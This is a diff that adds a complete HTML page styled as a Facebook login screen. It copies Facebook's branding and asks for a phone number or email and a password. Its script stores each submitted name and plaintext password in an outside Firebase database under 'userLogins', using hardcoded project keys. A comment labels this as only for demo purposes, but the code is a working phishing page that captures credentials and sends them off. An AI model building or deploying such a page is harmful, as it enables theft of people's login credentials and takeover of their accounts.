@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Style Login</title>
+  <style>
+    :root {
+      --fb-blue: #1877f2;
+      --fb-dark: #050505;
+      --fb-light: #f0f2f5;
+      --fb-white: #ffffff;
+      --fb-border: #ccd0d5;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: var(--fb-light);
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: var(--fb-white);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+      margin-top: 50px;
+      border-radius: 10px;
+    }
+
+    .fb-header {
+      text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--fb-blue);
+      margin-bottom: 10px;
+    }
+
+    .fb-subtext {
+      text-align: center;
+      font-size: 14px;
+      color: #606770;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: 600;
+      font-size: 14px;
+      color: var(--fb-dark);
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid var(--fb-border);
+      border-radius: 6px;
+      margin-bottom: 15px;
+      font-size: 16px;
+      background-color: var(--fb-white);
+    }
+
+    input:focus {
+      outline: none;
+      border-color: var(--fb-blue);
+    }
+
+    button {
+      background-color: var(--fb-blue);
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      width: 100%;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #165fc1;
+    }
+
+    .status {
+      margin-top: 15px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        margin: 20px 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="fb-header">facebook</div>
+    <div class="fb-subtext">Login to your account</div>
+
+    <form id="userForm">
+      <label for="name"></label>
+      <input type="text" id="name" required placeholder="Mobile number or email"/>
+
+      <label for="password"></label>
+      <input type="password" id="password" required placeholder="Enter your password"/>
+
+      <button type="submit">Login</button>
+    </form>
+
+    <div class="status" id="statusMsg"></div>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-database-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCs2d7YXi-oe-Vx3dGCtUCB7U3FUtuWGX4",
+      authDomain: "account-94793.firebaseapp.com",
+      databaseURL: "https://account-94793-default-rtdb.firebaseio.com",
+      projectId: "account-94793",
+      storageBucket: "account-94793.appspot.com",
+      messagingSenderId: "270278213194",
+      appId: "1:270278213194:web:d9057bd96d46c0c1f630b3",
+      measurementId: "G-1N3JGM1J89"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    const form = document.getElementById('userForm');
+    const statusMsg = document.getElementById('statusMsg');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const name = document.getElementById('name').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      const newEntryRef = database.ref("userLogins").push();
+
+      newEntryRef.set({
+        name,
+        password, // Note: Storing plaintext passwords is unsafe (only for demo purposes)
+        timestamp: new Date().toISOString()
+      })
+      .then(() => {
+        statusMsg.textContent = "✅ Login data submitted!";
+        statusMsg.style.color = "green";
+        form.reset();
+      })
+      .catch((error) => {
+        console.error("Error saving data: ", error);
+        statusMsg.textContent = "❌ Failed to submit. Try again.";
+        statusMsg.style.color = "red";
+      });
+    });
+  </script>
+
+</body>
+</html>
